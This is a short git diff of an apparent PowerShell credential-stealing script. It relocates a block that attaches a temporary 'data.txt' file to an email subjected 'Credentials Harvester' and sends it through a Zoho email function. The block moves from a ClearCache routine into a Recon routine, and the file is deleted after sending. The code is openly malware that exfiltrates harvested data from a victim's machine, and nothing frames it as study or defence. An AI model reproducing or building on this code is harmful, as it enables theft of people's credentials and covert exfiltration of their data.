@@ -488,6 +488,13 @@ function Recon{
 
     SetEmailSentFalse
 
+	# email data.txt
+	if (-not $isEmailSent) {
+        # Email parameters
+        $subject = "$env:USERNAME: Credentials Harvester - Sent on $currentDateTime"
+        $attachments = @("$env:TEMP\data.txt")  # Array of attachment file paths
+        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+    }
     ############################################################################################################################################################
 }
 function ClearCache {
@@ -499,14 +506,6 @@ function ClearCache {
         $attachments = @("$env:TEMP\example-logs.txt")  # Array of attachment file paths
         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
     } 
-
-	# email data.txt
-	if (-not $isEmailSent) {
-        # Email parameters
-        $subject = "$env:USERNAME: Credentials Harvester - Sent on $currentDateTime"
-        $attachments = @("$env:TEMP\data.txt")  # Array of attachment file paths
-        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-    }
 
     # RunWBPV
     Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
